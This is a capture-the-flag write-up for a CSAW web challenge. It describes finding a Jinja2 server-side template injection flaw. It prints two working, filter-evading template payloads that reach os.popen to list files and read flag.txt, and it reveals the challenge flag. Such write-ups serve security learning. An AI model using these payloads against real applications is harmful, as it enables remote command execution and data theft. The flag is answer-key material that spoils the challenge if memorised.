#### Challenge:

Hey guys come checkout this website i made to test my ninja-coding skills.

[http://web.chal.csaw.io:5000](http://web.chal.csaw.io:5000)

---

#### Solution:

We are given a website that with one text input and a button. We tried some javascript / CSS / SQL injection stufs but that was not it. Finally we realized that Ninja points to `Jinja`. After a bit of googlig we found this nice site about `Server Side template injection` using [jinja2](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti).

Fidling with it, we were able to run the `ls` command:

```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fim'+'port\x5f\x5f')('o'+'s')|attr('popen')('ls')|attr('read')()}}
```

And `cat` the `flag.txt`:

```jinja
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fim'+'port\x5f\x5f')('o'+'s')|attr('popen')('cat flag.txt')|attr('read')()}}
```

---

<details><summary>FLAG:</summary>

```
flag{m0mmy_s33_1m_4_r34l_n1nj4}
```

</details>
<br/>
